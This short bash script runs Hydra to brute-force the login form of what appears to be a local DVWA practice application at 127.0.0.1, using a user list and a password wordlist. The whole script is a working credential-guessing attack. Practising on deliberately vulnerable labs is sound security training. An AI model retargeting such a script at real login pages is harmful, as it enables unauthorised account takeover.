#!/bin/bash
echo 'Running Hydra...'
hydra -L users.txt -P wordlist.txt 127.0.0.1 http-post-form '/dvwa/login.php:user=^USER^&pass=^PASS^:Login failed' -V -o hydra.log